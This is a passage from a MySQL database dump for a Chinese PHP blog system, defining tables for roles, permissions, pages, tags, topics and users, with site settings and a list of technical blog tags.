  `price` varchar(100) DEFAULT NULL,
  `total` varchar(50) DEFAULT NULL,
  `instruction` mediumtext,
  `updatetime` int(10) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_product`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_role`
--

CREATE TABLE IF NOT EXISTS `la_role` (
  `id` smallint(6) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `status` tinyint(1) unsigned DEFAULT '1' COMMENT '是否启用0否1是',
  `remark` varchar(255) DEFAULT NULL,
  `createtime` int(11) unsigned NOT NULL DEFAULT '0',
  `updatetime` int(11) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `id` (`id`),
  KEY `id_2` (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_role`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_role_admin`
--

CREATE TABLE IF NOT EXISTS `la_role_admin` (
  `roleid` smallint(6) NOT NULL DEFAULT '0',
  `adminid` int(11) NOT NULL DEFAULT '0',
  KEY `userid` (`adminid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `la_role_admin`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_role_node`
--

CREATE TABLE IF NOT EXISTS `la_role_node` (
  `roleid` smallint(6) NOT NULL DEFAULT '0',
  `nodeid` smallint(6) unsigned NOT NULL DEFAULT '0',
  `access` tinyint(4) DEFAULT '0' COMMENT '是否具有操作权限 0只读 1操作',
  KEY `groupId` (`roleid`),
  KEY `nodeId` (`nodeid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `la_role_node`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_scrollimage`
--

CREATE TABLE IF NOT EXISTS `la_scrollimage` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `path` varchar(200) NOT NULL,
  `title` varchar(50) DEFAULT NULL,
  `link` varchar(200) DEFAULT NULL,
  `isshow` tinyint(1) NOT NULL DEFAULT '1' COMMENT '0隐藏1显示',
  `isdelete` tinyint(1) NOT NULL DEFAULT '0' COMMENT '0正常1已删除',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;

--
-- 转存表中的数据 `la_scrollimage`
--

INSERT INTO `la_scrollimage` (`id`, `path`, `title`, `link`, `isshow`, `isdelete`) VALUES
(1, '/uploads/ScrollImage/1381906619_jcpao4_791_1364279943_qg83i3_3808.jpg', '1', '#', 1, 0),
(2, '/uploads/ScrollImage/1381906636_divy61_1524_1364280038_2l6n4e_8019.jpg', '2', '#', 1, 0),
(3, '/uploads/ScrollImage/1381906650_bz59w8_6658_1364280067_duvmp8_5013.jpg', '3', '#', 1, 0);

-- --------------------------------------------------------

--
-- 表的结构 `la_searchlog`
--

CREATE TABLE IF NOT EXISTS `la_searchlog` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `keyword` varchar(20) NOT NULL COMMENT '搜索关键字',
  `logtime` int(10) NOT NULL DEFAULT '0' COMMENT '搜索时间',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_searchlog`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_singlepage`
--

CREATE TABLE IF NOT EXISTS `la_singlepage` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL COMMENT '单页页面标题',
  `tag` varchar(50) DEFAULT NULL COMMENT '单页页面标签',
  `author` varchar(50) DEFAULT NULL,
  `thumbimage` varchar(100) DEFAULT NULL COMMENT '缩略图',
  `seotitle` varchar(100) DEFAULT NULL,
  `keyword` varchar(100) DEFAULT NULL,
  `description` varchar(300) DEFAULT NULL,
  `filename` varchar(100) DEFAULT NULL,
  `template` varchar(50) DEFAULT NULL,
  `content` longtext COMMENT '页面内容',
  `state` tinyint(1) NOT NULL DEFAULT '1' COMMENT '文章状态 0:回收站 1:正常发布 2:草稿箱',
  `status` tinyint(1) NOT NULL DEFAULT '1' COMMENT '评论状态 0:禁止评论 1:允许评论',
  `clicknum` int(10) NOT NULL DEFAULT '0' COMMENT '点击数',
  `commentnum` int(10) NOT NULL DEFAULT '0' COMMENT '评论数',
  `publishtime` int(10) NOT NULL DEFAULT '0',
  `updatetime` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_singlepage`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_soft`
--

CREATE TABLE IF NOT EXISTS `la_soft` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `archiveid` int(10) NOT NULL DEFAULT '0' COMMENT '文档ID',
  `filetype` varchar(50) DEFAULT NULL COMMENT '软件类型',
  `authorization` varchar(50) DEFAULT NULL COMMENT '授权方式',
  `language` varchar(50) DEFAULT NULL COMMENT '界面语言',
  `filesize` int(10) DEFAULT '0' COMMENT '软件大小',
  `fileext` varchar(50) DEFAULT NULL COMMENT '文件类型',
  `environment` varchar(50) DEFAULT NULL COMMENT '运行环境',
  `officialsite` varchar(50) DEFAULT NULL COMMENT '官方网站',
  `createtime` int(10) DEFAULT '0' COMMENT '添加日期',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_soft`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_system`
--

CREATE TABLE IF NOT EXISTS `la_system` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'primarykey',
  `cfgname` varchar(50) NOT NULL COMMENT '参数名称',
  `cfginfo` varchar(100) NOT NULL COMMENT '参数描述',
  `cfgtype` varchar(20) DEFAULT NULL COMMENT '参数类型',
  `cfggroupid` int(1) DEFAULT '0' COMMENT '参数所属分组',
  `cfgvalue` varchar(500) DEFAULT NULL COMMENT '参数值',
  `cfgtime` int(10) NOT NULL DEFAULT '0' COMMENT '添加时间',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=10 ;

--
-- 转存表中的数据 `la_system`
--

INSERT INTO `la_system` (`id`, `cfgname`, `cfginfo`, `cfgtype`, `cfggroupid`, `cfgvalue`, `cfgtime`) VALUES
(1, 'host', '网站地址', 'string', 1, 'http://localhost:85', 1368437340),
(2, 'sitename', '网站名称', 'string', 1, '天下第一楼-步知道的博客', 1368437340),
(3, 'keywords', '网站关键字', 'text', 1, '天下第一楼,天一楼,步知道,博客,Blog,PHP,MySQL,JQuery,HTML,CSS,数据库,服务器,系统,Linux,Nginx,Apache', 1368437340),
(4, 'admin_path', '管理中心目录', 'string', 2, 'admin', 1368437340),
(5, 'archive_recover', '文章回收站(是/否)开启', 'boolean', 2, '1', 1368437340),
(6, 'description', '网站描述', 'text', 1, '天下第一楼-步知道的博客.\r\n不积跬步, 无以成千里; 不积小流, 无以成江海.\r\nwhile(!(succeed=try()))', 1368528355),
(7, 'HomeSiteTitle', '首页网站标题', 'string', 1, '天下第一楼-步知道的博客', 1369803326),
(8, 'AboutUs', '联系我们基本信息', 'text', 2, '', 1369830358),
(9, 'Version', '系统版本', 'string', 1, '1.0', 1369830358);

-- --------------------------------------------------------

--
-- 表的结构 `la_tag`
--

CREATE TABLE IF NOT EXISTS `la_tag` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `tagname` varchar(20) NOT NULL,
  `usecount` int(10) DEFAULT '0' COMMENT '使用次数',
  `searchcount` int(10) DEFAULT '0' COMMENT '搜索次数',
  PRIMARY KEY (`id`),
  KEY `tag` (`tagname`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=130 ;

--
-- 转存表中的数据 `la_tag`
--

INSERT INTO `la_tag` (`id`, `tagname`, `usecount`, `searchcount`) VALUES
(1, 'google', 5, 0),
(3, '导航', 2, 0),
(4, '菜单', 5, 0),
(5, 'PHP', 54, 0),
(6, 'static', 2, 0),
(7, '变量', 1, 0),
(8, 'Apache', 12, 0),
(9, 'Bench', 1, 0),
(10, '测试', 7, 0),
(11, 'xdebug', 1, 0),
(12, 'webgrind', 1, 0),
(13, 'MEMCACHE', 6, 0),
(14, 'MAC', 9, 0),
(15, 'OS', 6, 0),
(16, '文件', 2, 0),
(17, 'redis', 4, 0),
(18, 'benchmark', 2, 0),
(19, 'vim', 7, 0),
(20, 'gvim', 2, 0),
(21, '乱码', 2, 0),
(22, '解决方案', 6, 0),
(23, '微博', 3, 0),
(24, '架构', 3, 0),
(25, '演讲', 1, 0),
(26, 'MACOS', 2, 0),
(27, 'MySql', 19, 0),
(28, 'IDE', 6, 0),
(29, 'PDO', 2, 0),
(30, '书籍', 4, 0),
(31, '程序员', 1, 0),
(32, 'HTML5', 7, 0),
(33, 'WebSocket', 2, 0),
(34, '反向代理', 2, 0),
(35, '错误', 1, 0),
(36, 'pack', 2, 0),
(37, '方法', 1, 0),
(38, 'Nginx', 17, 0),
(39, 'ORM', 1, 0),
(40, '数据库', 11, 0),
(41, '原理', 2, 0),
(42, '服务器', 11, 0),
(43, 'Windows', 5, 0),
(44, '环境', 2, 0),
(45, '代码', 3, 0),
(46, '颜色', 2, 0),
(47, 'MACVIM', 2, 0),
(48, 'gvimrc', 1, 0),
(49, '24点', 1, 0),
(50, '算法', 2, 0),
(51, '安全', 1, 0),
(52, 'Session', 5, 0),
(53, '负载均衡', 2, 0),
(54, '全文检索', 1, 0),
(55, '中文', 2, 0),
(56, '分词', 1, 0),
(57, 'sphinx', 2, 0),
(58, 'Linux', 18, 0),
(59, 'crontab', 1, 0),
(60, '命令', 12, 0),
(61, 'Ubuntu', 4, 0),
(62, 'Find', 5, 0),
(63, 'Head', 3, 0),
(64, 'Tail', 3, 0),
(65, 'grep', 4, 0),
(66, 'sed', 3, 0),
(67, 'awk', 3, 0),
(68, '短标记', 1, 0),
(69, 'CPU', 1, 0),
(70, '硬件型号', 1, 0),
(71, 'MongoDB', 7, 0),
(72, 'webbench', 1, 0),
(73, '压力测试', 1, 0),
(74, 'Thinkphp', 2, 0),
(75, '优化', 2, 0),
(76, 'Sublime Text2', 4, 0),
(77, 'RGBA', 1, 0),
(78, 'Filter', 1, 0),
(79, 'CSS', 1, 0),
(80, '透明背景', 1, 0),
(81, 'FPM', 1, 0),
(82, 'Rewrite', 3, 0),
(83, 'JQuery', 8, 0),
(84, 'AjaxFileUpload', 1, 0),
(85, 'AJAX', 5, 0),
(86, 'CURL', 1, 0),
(87, 'Code Swarm', 1, 0),
(88, 'SVN', 1, 0),
(89, 'zlib', 1, 0),
(90, 'gzip', 1, 0),
(91, '病毒', 1, 0),
(92, 'SafeSys', 1, 0),
(93, 'AllowOverride', 1, 0),
(94, 'Mysqli', 2, 0),
(95, 'IIS', 3, 0),
(96, 'SQLServer', 3, 0),
(97, '人人围', 1, 0),
(98, 'MIME', 1, 0),
(99, 'XML', 1, 0),
(100, '加密', 3, 0),
(101, 'EXCEL', 1, 0),
(102, 'DNS', 1, 0),
(103, '污染', 1, 0),
(104, 'COM', 3, 0),
(105, '组件', 1, 0),
(106, 'DotNetZipLib', 1, 0),
(107, 'zip', 1, 0),
(108, 'C#', 1, 0),
(109, 'dll', 1, 0),
(110, '存储过程', 1, 0),
(111, '事务', 1, 0),
(112, '缓存技术', 1, 0),
(113, '设计模式', 1, 0),
(114, '单例', 1, 0),
(115, 'openfire', 1, 0),
(116, 'WebConfig', 1, 0),
(117, 'WIN7', 1, 0),
(118, 'Flush', 1, 0),
(119, 'PHPExcel', 1, 0),
(120, 'Virtualbox', 2, 0),
(121, 'Centos', 10, 0),
(122, 'vsftpd', 2, 0),
(123, 'Geometry', 1, 0),
(124, '空间坐标', 1, 0),
(125, '域名', 1, 0),
(126, '闭包', 6, 0),
(127, 'bind', 2, 0),
(128, 'live', 2, 0),
(129, 'delegate', 2, 0);

-- --------------------------------------------------------

--
-- 表的结构 `la_topic`
--

CREATE TABLE IF NOT EXISTS `la_topic` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `archiveid` int(10) NOT NULL,
  `content` longtext,
  `updatetime` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_topic`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_topic_article`
--

CREATE TABLE IF NOT EXISTS `la_topic_article` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `archiveid` int(10) NOT NULL,
  `topicid` int(10) DEFAULT NULL COMMENT '专题ID',
  `topiccardid` int(10) DEFAULT NULL COMMENT '专题项ID',
  `content` longtext,
  `updatetime` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_topic_article`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_topic_card`
--

CREATE TABLE IF NOT EXISTS `la_topic_card` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `archiveid` int(10) NOT NULL COMMENT '专题ID',
  `title` varchar(50) NOT NULL COMMENT '专题项名称',
  `thumbimage` varchar(100) DEFAULT NULL,
  `description` longtext COMMENT '描述',
  `createtime` int(10) DEFAULT NULL,
  `updatetime` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_topic_card`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_user`
--

CREATE TABLE IF NOT EXISTS `la_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `nickname` varchar(20) DEFAULT NULL,
  `email` varchar(50) DEFAULT NULL,
  `remark` varchar(255) DEFAULT NULL,
  `ukey` char(6) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否正常用户 0已删除 1正常',
  `ustate` varchar(32) NOT NULL DEFAULT '',
  `urank` varchar(50) NOT NULL DEFAULT '0',
  `lastlogintime` int(10) DEFAULT '0' COMMENT '上次登录日期',
  `lastloginip` int(10) DEFAULT '0' COMMENT '上次登录IP',
  `logincount` int(10) DEFAULT '0' COMMENT '登录次数',
  `createtime` int(10) NOT NULL DEFAULT '0' COMMENT '创建日期',
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `la_user`
--

